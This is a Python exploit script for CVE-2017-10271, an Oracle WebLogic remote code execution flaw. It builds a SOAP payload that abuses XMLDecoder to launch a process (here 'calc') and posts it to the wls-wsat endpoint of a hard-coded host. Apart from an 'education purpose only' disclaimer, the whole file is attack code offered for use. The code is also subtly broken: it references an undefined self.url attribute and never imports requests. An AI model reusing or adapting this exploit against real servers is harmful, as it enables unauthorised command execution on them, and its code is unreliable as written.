#!/usr/bin/env python
#__author__ == 'Kios'

class Exp(object):
	'''
	CVE-2017-10271 Weblogic RCE Exp
	Education purpose only! Do not use illegal way!
	'''
	def __init__(self, host, port):
		self.host = host
		self.port = port
		self.payload = '''
		<soapenv:Envelope     xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">

	    <soapenv:Header>
	       <work:WorkContext    xmlns:work="http://bea.com/2004/06/soap/workarea/">
	           <java      version="1.8" class="java.beans.XMLDecoder">
	                <void     class="java.lang.ProcessBuilder">
	                    <array    class="java.lang.String" length="3">
	                        <void     index="0">
	                            <string>calc</string>
	                        </void>
	                        <void     index="1">
	                            <string></string>
	                        </void>
	                        <void     index="2">
	                            <string></string>
	                        </void>
	                    </array>
	                <void     method="start"/></void>
	           </java>
	       </work:WorkContext>
	   </soapenv:Header>
	    <soapenv:Body/>
	    </soapenv:Envelope>
		'''
		self.headers = {'Content-Type':'text/xml','Cache-Control':'no-cache'}

	def exploit(self):
		'''
		exp. The response http status code should be 500 after exploit.
		'''
		exp_url = "http://" + str(self.url) + ":" + str(self.port) + "/wls-wsat/CoordinatorPortType"
		r = requests.post(exp_url, headers=self.headers, data=self.payload)

if __name__ == '__main__':
	obj1 = Exp('192.168.1.106', 7001)
	obj1.exploit()
